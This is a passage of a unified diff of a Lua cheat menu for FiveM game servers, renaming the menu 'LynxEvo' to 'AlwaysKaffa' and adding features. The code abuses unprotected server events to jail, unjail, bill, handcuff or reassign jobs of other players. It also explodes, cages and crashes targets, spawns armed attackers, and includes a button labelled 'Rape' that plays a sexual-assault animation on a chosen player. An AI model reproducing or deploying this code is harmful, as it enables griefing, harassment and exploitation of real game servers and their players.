                     local dW = 'PICKUP_ARMOUR_STANDARD'
                     local dX = GetHashKey(dW)
                     local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                     local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                     SetPickupRegenerationTime(pickup, 60)
-                elseif LynxEvo.Button('~h~~b~FULL Armour ~s~Player') then
+                elseif AlwaysKaffa.Button('~h~~b~FULL Armour ~s~Player') then
                     local dW = 'PICKUP_ARMOUR_STANDARD'
                     local dX = GetHashKey(dW)
                     local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
@@ -7952,7 +8120,7 @@ Citizen.CreateThread(
                         SetPickupRegenerationTime(pickup, 10)
                         i = i + 1
                     end
-                elseif LynxEvo.Button('~h~Teleport To') then
+                elseif AlwaysKaffa.Button('~h~Teleport To') then
                     if cO then
                         local confirm = KeyboardInput('Are you sure? y/n', '', 0)
                         if confirm == 'y' then
@@ -7973,7 +8141,7 @@ Citizen.CreateThread(
                         SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                     end
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Freeze Player',
                         freezeplayer,
                         function(dR)
@@ -7981,14 +8149,14 @@ Citizen.CreateThread(
                         end
                     )
                  then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Give Single Weapon', 'GiveSingleWeaponPlayer') then
-                elseif LynxEvo.Button('~h~Give ~r~All Weapons') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Give Single Weapon', 'GiveSingleWeaponPlayer') then
+                elseif AlwaysKaffa.Button('~h~Give ~r~All Weapons') then
                     for i = 1, #b6 do
                         GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false)
                     end
-                elseif LynxEvo.Button('~h~Remove ~r~All Weapons') then
+                elseif AlwaysKaffa.Button('~h~Remove ~r~All Weapons') then
                     RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
-                elseif LynxEvo.Button('~h~Give ~r~Vehicle') then
+                elseif AlwaysKaffa.Button('~h~Give ~r~Vehicle') then
                     local ped = GetPlayerPed(SelectedPlayer)
                     local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
                     if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
@@ -8001,33 +8169,66 @@ Citizen.CreateThread(
                     else
                         av('~b~Model is not valid!', true)
                     end
-                elseif LynxEvo.Button('~h~Send To ~r~Jail') then
-                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(selectedPlayer), 5000, 'Jailed')
+                elseif AlwaysKaffa.Button('~h~Send To ~r~Jail') then
+                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(selectedPlayer), 5000, 'AlwaysKaffa')
                     TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
                     TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
-                    TriggerServerEvent('js:jailuser', GetPlayerServerId(selectedPlayer), 45 * 60, 'Jailed')
-                elseif LynxEvo.Button('~h~~g~Evade ~s~From Jail') then
-                    local dY = SelectedPlayer
-                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(dY), 0, 'escaperino')
-                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(dY), 0)
-                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(dY), 0)
-                    TriggerServerEvent('js:jailuser', GetPlayerServerId(dY), 0, 'escaperino')
+                    TriggerServerEvent('js:jailuser', GetPlayerServerId(selectedPlayer), 45 * 60, 'AlwaysKaffa')
+                elseif AlwaysKaffa.Button('~h~~g~Evade ~s~From Jail') then
+                    TriggerServerEvent('esx-qalle-jail:unJailPlayer', GetPlayerServerId(SelectedPlayer))
+                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(SelectedPlayer), 0)
+                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(SelectedPlayer), 0)
+                    TriggerServerEvent('js:jailuser', GetPlayerServerId(SelectedPlayer), 0, 'escaperino')
+                elseif AlwaysKaffa.Button('~h~Send To ~r~Community Service') then
+                    TriggerServerEvent('esx_communityservice:sendToCommunityService', GetPlayerServerId(SelectedPlayer), 60)
+                elseif AlwaysKaffa.Button('~h~~g~Evade ~s~From ~r~Community Service') then
+                    TriggerServerEvent('esx_communityservice:endCommunityServiceCommand', GetPlayerServerId(SelectedPlayer))
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESXTriggerini') then
-                if LynxEvo.Button('~h~~g~Revive Player') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXTriggersSelf') then
+                    if AlwaysKaffa.Button('~h~~g~ESX ~s~Revive Yourself~s~') then
+                        TriggerEvent('esx_ambulancejob:revive')
+                        TriggerEvent('ambulancier:selfRespawn')
+                    elseif AlwaysKaffa.Button('~h~~g~ESX ~s~Open Jail Menu~s~') then
+                        TriggerEvent("esx-qalle-jail:openJailMenu")
+                    elseif AlwaysKaffa.Button("~h~~g~ESX ~s~Evade From ~r~Jail") then
+                        TriggerServerEvent('esx_jailer:unjailTime', -1)
+                        TriggerServerEvent('JailUpdate', 0)
+                        TriggerEvent('UnJP')
+                        TriggerEvent('esx-qalle-jail:unJailPlayer')
+                    elseif AlwaysKaffa.Button("~h~~g~ESX ~s~Evade From ~r~Community Service") then
+                        TriggerServerEvent('esx_communityservice:finishCommunityService')
+                    elseif AlwaysKaffa.Button("~h~Set ~o~hunger ~s~to ~h~~g~100") then
+                        TriggerEvent("esx_status:set", "hunger", 1000000)
+                    elseif AlwaysKaffa.Button("~h~Set ~b~thirst ~s~to ~h~~g~100") then
+                        TriggerEvent("esx_status:set", "thirst", 1000000)
+                    end
+                    AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXTriggerini') then
+                if AlwaysKaffa.Button('~h~~g~Open Inventory') then
+                    TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
+                elseif AlwaysKaffa.Button('~h~Send Bill') then
+                    local bA=KeyboardInput("Enter amount","",100000000)
+                    local ah=KeyboardInput("Enter the name of the bill","",100000000)
+                    if bA and ah then 
+                        TriggerServerEvent('esx_billing:sendBill',GetPlayerServerId(SelectedPlayer),"5391 was here",ah,bA)
+                    else
+                        return
+                    end
+                elseif AlwaysKaffa.Button('~h~~g~Revive Player') then
                     local ax = GetPlayerPed(SelectedPlayer)
                     local bK = GetEntityCoords(ax)
-                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
+                    --TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                     local dZ = {
                         x = ESX.Math.Round(bK.x, 1),
                         y = ESX.Math.Round(bK.y, 1),
                         z = ESX.Math.Round(bK.z, 1)
                     }
                     RespawnPed(ax, dZ, 0.0)
-                    StopScreenEffect('DeathFailOut')
-                    DoScreenFadeIn(800)
-                elseif LynxEvo.Button('~h~~g~Give money to player from your wallet') then
+                    --StopScreenEffect('DeathFailOut')
+                    --DoScreenFadeIn(800)
+                    TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
+                elseif AlwaysKaffa.Button('~h~~g~Give money to player from your wallet') then
                     local m = KeyboardInput('Enter amount of money to give', '', 100)
                     if m ~= '' then
                         TriggerServerEvent(
@@ -8038,12 +8239,32 @@ Citizen.CreateThread(
                             m
                         )
                     end
-                elseif LynxEvo.Button('~h~~b~Handcuff Player') then
+                elseif AlwaysKaffa.Button('~h~~b~Handcuff Player') then
                     TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
+                elseif AlwaysKaffa.Button('~h~~r~Jail Player 30 minutes') then
+                    TriggerServerEvent(
+                        'esx-qalle-jail:jailPlayer',
+                        GetPlayerServerId(SelectedPlayer),
+                        30,
+                        'VDM/RDM'
+                    )
+                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
+                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
+                    TriggerServerEvent('js:jailuser', GetPlayerServerId(SelectedPlayer), 45 * 60, 'unknown')
+				elseif AlwaysKaffa.Button('~h~~r~Jail Player 60 minutes') then
+                    TriggerServerEvent(
+                        'esx-qalle-jail:jailPlayer',
+                        GetPlayerServerId(SelectedPlayer),
+                        60,
+                        'VDM/RDM'
+                    )
+                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
+                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
+                    TriggerServerEvent('js:jailuser', GetPlayerServerId(SelectedPlayer), 45 * 60, 'unknown')
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('VRPPlayerTriggers') then
-                if LynxEvo.Button('~h~Transfer money from your bank') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('VRPPlayerTriggers') then
+                if AlwaysKaffa.Button('~h~Transfer money from your bank') then
                     local d_ = KeyboardInput('Enter amount of money to give', '', 100)
                     local e0 = KeyboardInput('Enter VRP PERMA ID!', '', 100)
                     if d_ ~= '' then
@@ -8052,34 +8273,34 @@ Citizen.CreateThread(
                         TriggerServerEvent('bank:transfer', e0, d_)
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESXJobs2') then
-                if LynxEvo.Button('~h~Set Unemployed') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXJobs2') then
+                if AlwaysKaffa.Button('~h~Set Unemployed') then
                     TriggerServerEvent('NB:destituerplayer', GetPlayerServerId(SelectedPlayer))
                     UnemployedPlayer(SelectedPlayer)
-                elseif LynxEvo.Button('~h~Set ~b~Police ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set ~b~Police ~s~Job') then
                     TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'police', 3)
                     PolicePlayer(SelectedPlayer)
-                elseif LynxEvo.Button('~h~Set ~o~Mecano ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set ~o~Mecano ~s~Job') then
                     TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'mecano', 3)
                     MecanoPlayer(SelectedPlayer)
-                elseif LynxEvo.Button('~h~Set ~y~Taxi ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set ~y~Taxi ~s~Job') then
                     TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'taxi', 3)
                     TaxiPlayer(SelectedPlayer)
-                elseif LynxEvo.Button('~h~Set ~r~Ambulance ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set ~r~Ambulance ~s~Job') then
                     TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'ambulance', 3)
                     AmbulancePlayer(SelectedPlayer)
-                elseif LynxEvo.Button('~h~Set ~g~Real Estate ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set ~g~Real Estate ~s~Job') then
                     TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'realestateagent', 3)
                     RealEstateAgentPlayer(SelectedPlayer)
-                elseif LynxEvo.Button('~h~Set ~r~Car ~b~Dealer ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set ~r~Car ~b~Dealer ~s~Job') then
                     TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'cardealer', 3)
                     CarDealerPlayer(SelectedPlayer)
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('Trollmenu') then
-                if LynxEvo.MenuButton('~h~~p~#~s~ Spawn Peds', 'SpawnPeds') then
-                elseif LynxEvo.Button('~h~~r~Fake ~s~Chat Message') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('Trollmenu') then
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ Spawn Peds', 'SpawnPeds') then
+                --[[elseif AlwaysKaffa.Button('~h~~r~Fake ~s~Chat Message') then
                     local e1 = KeyboardInput('Enter message to send', '', 100)
                     local e2 = GetPlayerName(SelectedPlayer)
                     if e1 then
@@ -8093,26 +8314,26 @@ Citizen.CreateThread(
                             },
                             e1
                         )
-                    end
-                elseif LynxEvo.Button('~h~~r~Kick ~s~From Vehicle') then
+                    end--]]
+                elseif AlwaysKaffa.Button('~h~~r~Kick ~s~From Vehicle') then
                     ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-                elseif LynxEvo.Button('~h~~y~Explode ~s~Vehicle') then
+                elseif AlwaysKaffa.Button('~h~~y~Explode ~s~Vehicle') then
                     if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                         AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                     else
                         av('~h~~b~Player not in a vehicle~s~.', false)
                     end
-                elseif LynxEvo.Button('~h~~r~Launch ~s~his car') then
+                elseif AlwaysKaffa.Button('~h~~r~Launch ~s~his car') then
                     if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false) ~= 0 then
                         local e3 = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                         local e4 = GetEntityHeading(GetPlayerPed(SelectedPlayer))
-                        local e5 = CreatePed(5, 68070371, e3, e4, true)
+                        --local e5 = CreatePed(5, 68070371, e3, e4, true)
                         local e6 = CreateVehicle(GetHashKey('adder'), e3, e4, true, false)
                         SetPedIntoVehicle(e5, e6, -1)
                     else
                         av('~h~~b~Player not in a vehicle~s~.', false)
                     end
-                elseif LynxEvo.Button('~h~~r~Banana ~p~Party') then
+                elseif AlwaysKaffa.Button('~h~~r~Banana ~p~Party') then
                     local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                     local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                     local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
@@ -8167,10 +8388,10 @@ Citizen.CreateThread(
                         1,
                         true
                     )
-                elseif LynxEvo.Button('~h~~r~Explode') then
+                elseif AlwaysKaffa.Button('~h~~r~Explode') then
                     AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                     AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
-                elseif LynxEvo.Button('~h~~r~Rape') then
+                elseif AlwaysKaffa.Button('~h~~r~Rape') then
                     RequestModelSync('a_m_o_acult_01')
                     RequestAnimDict('rcmpaparazzo_2')
                     while not HasAnimDictLoaded('rcmpaparazzo_2') do
@@ -8228,7 +8449,7 @@ Citizen.CreateThread(
                         SetEntityInvincible(bS, true)
                         count = count - 0.4
                     end
-                elseif LynxEvo.Button('~h~~r~Cage ~s~Player') then
+                elseif AlwaysKaffa.Button('~h~~r~Cage ~s~Player') then
                     x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                     roundx = tonumber(string.format('%.2f', x))
                     roundy = tonumber(string.format('%.2f', y))
@@ -8245,7 +8466,7 @@ Citizen.CreateThread(
                     SetEntityHeading(ea, 90.0)
                     FreezeEntityPosition(e9, true)
                     FreezeEntityPosition(ea, true)
-                elseif LynxEvo.Button('~h~~r~Hamburgher ~s~Player') then
+                elseif AlwaysKaffa.Button('~h~~r~Hamburgher ~s~Player') then
                     local eb = 'xs_prop_hamburgher_wl'
                     local ec = GetHashKey(eb)
                     local ed = CreateObject(ec, 0, 0, 0, true, true, true)
@@ -8266,7 +8487,7 @@ Citizen.CreateThread(
                         1,
                         true
                     )
-                elseif LynxEvo.Button('~h~~r~Hamburgher ~s~Player Car') then
+                elseif AlwaysKaffa.Button('~h~~r~Hamburgher ~s~Player Car') then
                     local eb = 'xs_prop_hamburgher_wl'
                     local ec = GetHashKey(eb)
                     local ed = CreateObject(ec, 0, 0, 0, true, true, true)
@@ -8287,70 +8508,7 @@ Citizen.CreateThread(
                         1,
                         true
                     )
-                elseif LynxEvo.Button('~h~~r~Snowball troll ~s~Player') then
-                    j = true
-                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
-                    roundx = tonumber(string.format('%.2f', x))
-                    roundy = tonumber(string.format('%.2f', y))
-                    roundz = tonumber(string.format('%.2f', z))
-                    local ee = 'sr_prop_spec_tube_xxs_01a'
-                    local ef = GetHashKey(ee)
-                    RequestModel(ef)
-                    RequestModel(smashhash)
-                    while not HasModelLoaded(ef) do
-                        Citizen.Wait(0)
-                    end
-                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
-                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
-                    local eh = -356333586
-                    local bR = 'WEAPON_SNOWBALL'
-                    for i = 0, 10 do
-                        local bK = GetEntityCoords(eg)
-                        RequestModel(eh)
-                        Citizen.Wait(50)
-                        if HasModelLoaded(eh) then
-                            local ped =
-                                CreatePed(
-                                21,
-                                eh,
-                                bK.x + math.sin(i * 2.0),
-                                bK.y - math.sin(i * 2.0),
-                                bK.z - 5.0,
-                                0,
-                                true,
-                                true
-                            ) and
-                                CreatePed(
-                                    21,
-                                    eh,
-                                    bK.x - math.sin(i * 2.0),
-                                    bK.y + math.sin(i * 2.0),
-                                    bK.z - 5.0,
-                                    0,
-                                    true,
-                                    true
-                                )
-                            NetworkRegisterEntityAsNetworked(ped)
-                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
-                                local ei = PedToNet(ped)
-                                NetworkSetNetworkIdDynamic(ei, false)
-                                SetNetworkIdCanMigrate(ei, true)
-                                SetNetworkIdExistsOnAllMachines(ei, true)
-                                Citizen.Wait(500)
-                                NetToPed(ei)
-                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
-                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
-                                SetEntityInvincible(ped, true)
-                                SetPedCanSwitchWeapon(ped, true)
-                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
-                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
-                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
-                            else
-                                Citizen.Wait(0)
-                            end
-                        end
-                    end
-                elseif LynxEvo.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
+                elseif AlwaysKaffa.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                     local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                     local ek = {
                         0x9CF21E0F,
@@ -8390,9 +8548,9 @@ Citizen.CreateThread(
                         local a = CreateObject(ek[i], ej, true, true, true)
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('SpawnPeds') then
-                if LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~AK') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('SpawnPeds') then
+                if AlwaysKaffa.Button('~h~~r~Spawn ~s~Swat army with ~y~AK') then
                     local bQ = 's_m_y_swat_01'
                     local bR = 'WEAPON_ASSAULTRIFLE'
                     for i = 0, 10 do
@@ -8422,7 +8580,7 @@ Citizen.CreateThread(
                             end
                         end
                     end
-                elseif LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~RPG') then
+                elseif AlwaysKaffa.Button('~h~~r~Spawn ~s~Swat army with ~y~RPG') then
                     local bQ = 's_m_y_swat_01'
                     local bR = 'weapon_rpg'
                     for i = 0, 10 do
@@ -8452,7 +8610,7 @@ Citizen.CreateThread(
                             end
                         end
                     end
-                elseif LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~Flaregun') then
+                elseif AlwaysKaffa.Button('~h~~r~Spawn ~s~Swat army with ~y~Flaregun') then
                     local bQ = 's_m_y_swat_01'
                     local bR = 'weapon_flaregun'
                     for i = 0, 10 do
@@ -8482,7 +8640,7 @@ Citizen.CreateThread(
                             end
                         end
                     end
-                elseif LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~Railgun') then
+                elseif AlwaysKaffa.Button('~h~~r~Spawn ~s~Swat army with ~y~Railgun') then
                     local bQ = 's_m_y_swat_01'
                     local bR = 'weapon_railgun'
                     for i = 0, 10 do
@@ -8513,28 +8671,27 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
+                AlwaysKaffa.Display()
             elseif
-                IsDisabledControlPressed(0, 121) or IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) or
-                    IsDisabledControlPressed(0, 36)
+                IsDisabledControlPressed(0, 121) 
              then
-                if mhaonn then
-                    LynxEvo.OpenMenu('xAriess')
+                if H4tuf5 then
+                    AlwaysKaffa.OpenMenu('AlwaysKaffa')
                 else
-                    bE()
+                    TmEM1U()
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('TeleportMenu') then
-                if LynxEvo.Button('~h~Teleport to ~g~waypoint') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('TeleportMenu') then
+                if AlwaysKaffa.Button('~h~Teleport to ~g~waypoint') then
                     c6()
-                elseif LynxEvo.Button('~h~Teleport into ~g~nearest ~s~vehicle') then
+                elseif AlwaysKaffa.Button('~h~Teleport into ~g~nearest ~s~vehicle') then
                     b_()
-                elseif LynxEvo.Button('~h~Teleport to ~r~coords') then
+                elseif AlwaysKaffa.Button('~h~Teleport to ~r~coords') then
                     bT()
-                elseif LynxEvo.Button('~h~Draw custom ~r~blip ~s~on map') then
+                elseif AlwaysKaffa.Button('~h~Draw custom ~r~blip ~s~on map') then
                     bX()
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Show ~g~Coords',
                         showCoords,
                         function(dR)
@@ -8543,41 +8700,49 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('WeaponMenu') then
-                if LynxEvo.MenuButton('~h~~p~#~s~ Give Single Weapon', 'WeaponTypes') then
-                elseif LynxEvo.Button('~h~~g~Give All Weapons') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('WeaponMenu') then
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ Give Single Weapon', 'WeaponTypes') then
+                elseif AlwaysKaffa.Button('~h~~g~Give All Weapons') then
                     for i = 1, #b6 do
                         GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false)
                     end
-                elseif LynxEvo.Button('~h~~r~Remove All Weapons') then
+                elseif AlwaysKaffa.Button('~h~~r~Remove All Weapons') then
                     RemoveAllPedWeapons(PlayerPedId(-1), true)
-                elseif LynxEvo.Button('~h~Drop your current Weapon') then
+                elseif AlwaysKaffa.Button('~h~Drop your current Weapon') then
                     local ak = GetPlayerPed(-1)
                     local b = GetSelectedPedWeapon(ak)
                     SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
-                elseif LynxEvo.Button('~h~~g~Give All Weapons to ~s~everyone') then
+                elseif AlwaysKaffa.Button('~h~~g~Give All Weapons to ~s~everyone') then
                     for el = 0, 128 do
-                        if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
+                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                             for i = 1, #b6 do
                                 GiveWeaponToPed(GetPlayerPed(el), GetHashKey(b6[i]), 1000, false, false)
                             end
-                        end
+                        --end
                     end
-                elseif LynxEvo.Button('~h~~r~Remove All Weapons from ~s~everyone') then
+					elseif AlwaysKaffa.Button('~h~~g~Give Pistol to ~s~everyone') then
                     for el = 0, 128 do
-                        if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
+                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
+                            for i = 1, #bPistol do
+                                GiveWeaponToPed(GetPlayerPed(el), GetHashKey(bPistol[i]), 1000, false, false)
+                            end
+                        --end
+                    end
+                elseif AlwaysKaffa.Button('~h~~r~Remove All Weapons from ~s~everyone') then
+                    for el = 0, 128 do
+                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                             for i = 1, #b6 do
                                 RemoveWeaponFromPed(GetPlayerPed(el), GetHashKey(b6[i]))
                             end
-                        end
+                        --end
                     end
-                elseif LynxEvo.Button('~h~Give Ammo') then
+                elseif AlwaysKaffa.Button('~h~Give Ammo') then
                     for i = 1, #b6 do
                         AddAmmoToPed(PlayerPedId(-1), GetHashKey(b6[i]), 200)
                     end
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~OneShot Kill',
                         oneshot,
                         function(dR)
@@ -8586,7 +8751,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Flare Gun',
                         rainbowf,
                         function(dR)
@@ -8595,7 +8760,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Vehicle Gun',
                         VehicleGun,
                         function(dR)
@@ -8604,7 +8769,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Delete Gun',
                         DeleteGun,
                         function(dR)
@@ -8613,32 +8778,32 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('tunings') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('tunings') then
                 veh = GetVehiclePedIsUsing(PlayerPedId())
                 for i, dE in pairs(bl) do
                     if dE.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
-                        if LynxEvo.MenuButton(dE.name, dE.id) then
+                        if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                         end
                     elseif dE.id == 'neon' then
-                        if LynxEvo.MenuButton(dE.name, dE.id) then
+                        if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                         end
                     elseif dE.id == 'paint' then
-                        if LynxEvo.MenuButton(dE.name, dE.id) then
+                        if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                         end
                     elseif dE.id == 'wheeltypes' then
-                        if LynxEvo.MenuButton(dE.name, dE.id) then
+                        if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                         end
                     elseif dE.id == 'headlight' then
-                        if LynxEvo.MenuButton(dE.name, dE.id) then
+                        if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                         end
                     elseif dE.id == 'licence' then
-                        if LynxEvo.MenuButton(dE.name, dE.id) then
+                        if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                         end
                     else
                         local az = checkValidVehicleMods(dE.id)
                         for ci, dL in pairs(az) do
-                            if LynxEvo.MenuButton(dE.name, dE.id) then
+                            if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                             end
                             break
                         end
@@ -8649,18 +8814,18 @@ Citizen.CreateThread(
                 else
                     xenonStatus = 'Not Installed'
                 end
-                if LynxEvo.Button('Xenon Headlight', xenonStatus) then
+                if AlwaysKaffa.Button('Xenon Headlight', xenonStatus) then
                     if not IsToggleModOn(veh, 22) then
                         ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                     else
                         ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('performance') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('performance') then
                 veh = GetVehiclePedIsUsing(PlayerPedId())
                 for i, dE in pairs(bm) do
-                    if LynxEvo.MenuButton(dE.name, dE.id) then
+                    if AlwaysKaffa.MenuButton(dE.name, dE.id) then
                     end
                 end
                 if IsToggleModOn(veh, 18) then
@@ -8668,33 +8833,33 @@ Citizen.CreateThread(
                 else
                     turboStatus = 'Not Installed'
                 end
-                if LynxEvo.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
+                if AlwaysKaffa.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                     if not IsToggleModOn(veh, 18) then
                         ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                     else
                         ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('primary') then
-                LynxEvo.MenuButton('~h~~p~#~s~ Classic', 'classic1')
-                LynxEvo.MenuButton('~h~~p~#~s~ Metallic', 'metallic1')
-                LynxEvo.MenuButton('~h~~p~#~s~ Matte', 'matte1')
-                LynxEvo.MenuButton('~h~~p~#~s~ Metal', 'metal1')
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('secondary') then
-                LynxEvo.MenuButton('~h~~p~#~s~ Classic', 'classic2')
-                LynxEvo.MenuButton('~h~~p~#~s~ Metallic', 'metallic2')
-                LynxEvo.MenuButton('~h~~p~#~s~ Matte', 'matte2')
-                LynxEvo.MenuButton('~h~~p~#~s~ Metal', 'metal2')
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('rimpaint') then
-                LynxEvo.MenuButton('~h~~p~#~s~ Classic', 'classic3')
